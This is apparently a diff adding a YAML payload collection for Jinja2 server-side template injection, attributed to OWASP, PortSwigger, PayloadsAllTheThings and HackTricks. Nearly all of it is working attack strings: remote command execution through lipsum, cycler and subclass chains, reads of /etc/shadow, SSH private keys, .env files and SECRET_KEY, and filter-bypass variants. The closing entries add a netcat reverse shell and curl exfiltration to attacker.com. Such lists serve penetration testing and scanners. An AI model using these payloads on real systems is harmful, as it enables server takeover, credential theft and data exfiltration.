@@ -1,0 +1,494 @@
+metadata:
+  type: ssti/jinja2
+  version: "1.0"
+  description: "Jinja2 SSTI payloads"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "49"
+  - "<Config"
+  - "class\\s+.*?object"
+  - "__class__"
+  - "__mro__"
+  - "__subclasses__"
+
+payloads:
+  basic:
+    - value: "{{7*7}}"
+      description: "Basic arithmetic test"
+      severity: high
+      tags: [basic, detection]
+
+    - value: "{{7*'7'}}"
+      description: "String multiplication"
+      severity: high
+      tags: [basic, detection]
+
+    - value: "{{7+7}}"
+      description: "Addition test"
+      severity: high
+      tags: [basic, detection]
+
+    - value: "{{7-7}}"
+      description: "Subtraction test"
+      severity: high
+      tags: [basic, detection]
+
+    - value: "{{7/7}}"
+      description: "Division test"
+      severity: high
+      tags: [basic, detection]
+
+    - value: "{{1337*1337}}"
+      description: "Large multiplication"
+      severity: high
+      tags: [basic, detection]
+
+    - value: "{{config}}"
+      description: "Config object access"
+      severity: high
+      tags: [basic, config]
+
+    - value: "{{config.items()}}"
+      description: "Config items dump"
+      severity: high
+      tags: [basic, config]
+
+    - value: "{{config.SECRET_KEY}}"
+      description: "Secret key extraction"
+      severity: critical
+      tags: [basic, config, secret]
+
+    - value: "{{config.SQLALCHEMY_DATABASE_URI}}"
+      description: "Database URI extraction"
+      severity: critical
+      tags: [basic, config, secret]
+
+    - value: "{{config.items()|string}}"
+      description: "Config as string"
+      severity: high
+      tags: [basic, config]
+
+    - value: "{{request}}"
+      description: "Request object"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.environ}}"
+      description: "Request environment"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.environ.get('SERVER_NAME')}}"
+      description: "Server name"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.environ.get('SERVER_PORT')}}"
+      description: "Server port"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.environ.get('HTTP_HOST')}}"
+      description: "HTTP Host header"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.headers}}"
+      description: "Request headers"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.cookies}}"
+      description: "Request cookies"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.args}}"
+      description: "Request query args"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.form}}"
+      description: "Request form data"
+      severity: high
+      tags: [basic, request]
+
+    - value: "{{request.url}}"
+      description: "Request URL"
+      severity: medium
+      tags: [basic, request]
+
+    - value: "{{request.path}}"
+      description: "Request path"
+      severity: medium
+      tags: [basic, request]
+
+    - value: "{{request.method}}"
+      description: "Request method"
+      severity: medium
+      tags: [basic, request]
+
+    - value: "{{g}}"
+      description: "Global object"
+      severity: high
+      tags: [basic, global]
+
+    - value: "{{session}}"
+      description: "Session object"
+      severity: high
+      tags: [basic, session]
+
+    - value: "{{lipsum}}"
+      description: "Lipsum function (OS module access)"
+      severity: high
+      tags: [basic, function]
+
+    - value: "{{cycler}}"
+      description: "Cycler function"
+      severity: medium
+      tags: [basic, function]
+
+    - value: "{{joiner}}"
+      description: "Joiner function"
+      severity: medium
+      tags: [basic, function]
+
+    - value: "{{namespace}}"
+      description: "Namespace function"
+      severity: medium
+      tags: [basic, function]
+
+  rce:
+    - value: "{{lipsum.__globals__['os'].popen('id').read()}}"
+      description: "RCE via lipsum + os.popen"
+      severity: critical
+      tags: [rce, lipsum]
+
+    - value: "{{lipsum.__globals__['os'].popen('whoami').read()}}"
+      description: "RCE whoami via lipsum"
+      severity: critical
+      tags: [rce, lipsum]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}"
+      description: "RCE file read via lipsum"
+      severity: critical
+      tags: [rce, lipsum, file_read]
+
+    - value: "{{lipsum.__globals__['os'].popen('ls -la').read()}}"
+      description: "RCE ls via lipsum"
+      severity: critical
+      tags: [rce, lipsum]
+
+    - value: "{{lipsum.__globals__['os'].popen('uname -a').read()}}"
+      description: "RCE uname via lipsum"
+      severity: critical
+      tags: [rce, lipsum]
+
+    - value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      description: "RCE via config class chain"
+      severity: critical
+      tags: [rce, config_chain]
+
+    - value: "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}"
+      description: "Config leak via request chain"
+      severity: critical
+      tags: [rce, config_chain]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()}}"
+      description: "MRO subclasses enumeration"
+      severity: critical
+      tags: [rce, mro]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}"
+      description: "RCE via subprocess Popen"
+      severity: critical
+      tags: [rce, mro, subprocess]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}"
+      description: "RCE file read via subprocess"
+      severity: critical
+      tags: [rce, mro, subprocess, file_read]
+
+    - value: "{{().__class__.__bases__[0].__subclasses__()}}"
+      description: "Tuple MRO subclasses"
+      severity: critical
+      tags: [rce, mro]
+
+    - value: "{{''.__class__.__mro__[1].__subclasses__()}}"
+      description: "MRO index 1"
+      severity: critical
+      tags: [rce, mro]
+
+    - value: "{{(1).__class__.__bases__[0].__subclasses__()}}"
+      description: "Int MRO subclasses"
+      severity: critical
+      tags: [rce, mro]
+
+    - value: "{{[].__class__.__base__.__subclasses__()}}"
+      description: "List MRO subclasses"
+      severity: critical
+      tags: [rce, mro]
+
+    - value: "{{self.__class__.__mro__}}"
+      description: "Self class MRO"
+      severity: critical
+      tags: [rce, mro]
+
+    - value: "{{self.__class__.__mro__[2].__subclasses__()}}"
+      description: "Self MRO subclasses"
+      severity: critical
+      tags: [rce, mro]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX].__init__.__globals__['popen']('id').read()}}"
+      description: "RCE via popen globals"
+      severity: critical
+      tags: [rce, mro, popen]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"
+      description: "RCE via builtins import"
+      severity: critical
+      tags: [rce, mro, builtins]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}"
+      description: "RCE via builtins eval"
+      severity: critical
+      tags: [rce, mro, eval]
+
+    - value: "{{request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')}}"
+      description: "Attribute chain via attr filter"
+      severity: critical
+      tags: [rce, attr]
+
+    - value: "{{x.__init__.__globals__['__builtins__'].__import__('os').popen('id').read()}}"
+      description: "RCE via init globals"
+      severity: critical
+      tags: [rce, init]
+
+    - value: "{{x.__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('id',shell=True)}}"
+      description: "RCE via subprocess import"
+      severity: critical
+      tags: [rce, subprocess]
+
+    - value: "{{x.__init__.__globals__['__builtins__']['__import__']('subprocess').getoutput('id')}}"
+      description: "RCE via subprocess getoutput"
+      severity: critical
+      tags: [rce, subprocess]
+
+    - value: "{{x.__init__.__globals__['__builtins__']['__import__']('os').listdir('.')}}"
+      description: "Directory listing via import"
+      severity: critical
+      tags: [rce, ls]
+
+    - value: "{{x.__init__.__globals__['__builtins__']['__import__']('os').environ}}"
+      description: "Environment variables"
+      severity: high
+      tags: [rce, env]
+
+  file_read:
+    - value: "{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}"
+      description: "Read /etc/passwd"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat /etc/shadow').read()}}"
+      description: "Read /etc/shadow"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat /proc/self/environ').read()}}"
+      description: "Read process env"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat /proc/version').read()}}"
+      description: "Read kernel version"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat ~/.ssh/id_rsa').read()}}"
+      description: "Read SSH key"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat /var/www/html/.env').read()}}"
+      description: "Read .env file"
+      severity: critical
+      tags: [file_read, linux]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat /etc/hosts').read()}}"
+      description: "Read hosts file"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "{{lipsum.__globals__['os'].popen('cat /var/log/apache2/access.log').read()}}"
+      description: "Read Apache log"
+      severity: high
+      tags: [file_read, linux]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX]('/etc/passwd').read()}}"
+      description: "File read via open()"
+      severity: critical
+      tags: [file_read, mro]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX]('/etc/passwd').readlines()}}"
+      description: "File readlines via open()"
+      severity: critical
+      tags: [file_read, mro]
+
+    - value: "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}"
+      description: "File read via config chain"
+      severity: critical
+      tags: [file_read, config_chain]
+
+    - value: "{{lipsum.__globals__['os'].popen('curl http://attacker.com/$(cat /etc/passwd | base64)').read()}}"
+      description: "Exfil via curl"
+      severity: critical
+      tags: [file_read, exfil]
+
+  filter_bypass:
+    - value: "{%% set a = 'os' %%}{{ lipsum.__globals__[a].popen('id').read() }}"
+      description: "Variable bypass"
+      severity: critical
+      tags: [filter_bypass, variable]
+
+    - value: "{{ lipsum['__gl'+'obals__']['o'+'s'].popen('id').read() }}"
+      description: "String concatenation bypass"
+      severity: critical
+      tags: [filter_bypass, concatenation]
+
+    - value: "{{ lipsum|attr('__globals__')|attr('os')|attr('popen')('id')|attr('read')() }}"
+      description: "Attr filter bypass"
+      severity: critical
+      tags: [filter_bypass, attr]
+
+    - value: "{{ lipsum['__globals__']['os']['popen']('id')['read']() }}"
+      description: "Bracket notation bypass"
+      severity: critical
+      tags: [filter_bypass, bracket]
+
+    - value: "{{ lipsum.__globals__.__getitem__('os').popen('id').read() }}"
+      description: "__getitem__ bypass"
+      severity: critical
+      tags: [filter_bypass, getitem]
+
+    - value: "{{ lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('os')|attr('popen')('id')|attr('read')() }}"
+      description: "Hex escape bypass"
+      severity: critical
+      tags: [filter_bypass, hex]
+
+    - value: "{{ lipsum|attr('\\u005f\\u005fglobals\\u005f\\u005f')|attr('os')|attr('popen')('id')|attr('read')() }}"
+      description: "Unicode escape bypass"
+      severity: critical
+      tags: [filter_bypass, unicode]
+
+    - value: "{%print(7*7)%}"
+      description: "Print tag bypass"
+      severity: high
+      tags: [filter_bypass, print]
+
+    - value: "{{(7*7)}}"
+      description: "Parenthesis bypass"
+      severity: high
+      tags: [filter_bypass, parenthesis]
+
+    - value: "{{7 * 7}}"
+      description: "Extra spaces"
+      severity: high
+      tags: [filter_bypass, whitespace]
+
+    - value: "{{ 7*7 }}"
+      description: "Spaces around expression"
+      severity: high
+      tags: [filter_bypass, whitespace]
+
+    - value: "{{7*7}}{# comment #}"
+      description: "With comment"
+      severity: high
+      tags: [filter_bypass, comment]
+
+    - value: "{% if 7*7 == 49 %}yes{% endif %}"
+      description: "Conditional test"
+      severity: high
+      tags: [filter_bypass, conditional]
+
+    - value: "{% for i in [1] %}{{ 7*7 }}{% endfor %}"
+      description: "Loop test"
+      severity: high
+      tags: [filter_bypass, loop]
+
+    - value: "{{ dict(aa=7)|join }}"
+      description: "Dict join bypass"
+      severity: high
+      tags: [filter_bypass, dict]
+
+  advanced:
+    - value: "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
+      description: "Template reference chain"
+      severity: critical
+      tags: [advanced, template_ref]
+
+    - value: "{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}"
+      description: "Namespace chain"
+      severity: critical
+      tags: [advanced, namespace]
+
+    - value: "{{cycler.__init__.__globals__.os.popen('id').read()}}"
+      description: "Cycler chain"
+      severity: critical
+      tags: [advanced, cycler]
+
+    - value: "{{joiner.__init__.__globals__.os.popen('id').read()}}"
+      description: "Joiner chain"
+      severity: critical
+      tags: [advanced, joiner]
+
+    - value: "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+      description: "Namespace init chain"
+      severity: critical
+      tags: [advanced, namespace]
+
+    - value: "{{dict(o=x)|attr('o')|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()}}"
+      description: "Dict attr chain"
+      severity: critical
+      tags: [advanced, dict]
+
+    - value: "{{range.__class__.__init__.__globals__['os'].popen('id').read()}}"
+      description: "Range class chain"
+      severity: critical
+      tags: [advanced, range]
+
+    - value: "{{().__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['popen']('id').read()}}"
+      description: "Tuple base chain"
+      severity: critical
+      tags: [advanced, tuple]
+
+    - value: "{{''.__class__.__mro__[2].__subclasses__()[INDEX]('flag.txt').read()}}"
+      description: "Read flag file"
+      severity: critical
+      tags: [advanced, flag]
+
+    - value: "{{lipsum.__globals__['os'].environ}}"
+      description: "Environment dump"
+      severity: high
+      tags: [advanced, env]
+
+    - value: "{{lipsum.__globals__['os'].popen('python3 -c \"import os;os.system(\\\"id\\\")\"').read()}}"
+      description: "Nested Python execution"
+      severity: critical
+      tags: [advanced, nested_python]
+
+    - value: "{{lipsum.__globals__['os'].popen('bash -c \"id\"').read()}}"
+      description: "Bash execution"
+      severity: critical
+      tags: [advanced, bash]
+
+    - value: "{{lipsum.__globals__['os'].popen('nc attacker.com 4444 -e /bin/bash').read()}}"
+      description: "Reverse shell"
+      severity: critical
+      tags: [advanced, reverse_shell]
+
+    - value: "{{lipsum.__globals__['os'].popen('curl attacker.com/$(whoami)').read()}}"
+      description: "Data exfiltration"
+      severity: critical
+      tags: [advanced, exfil]
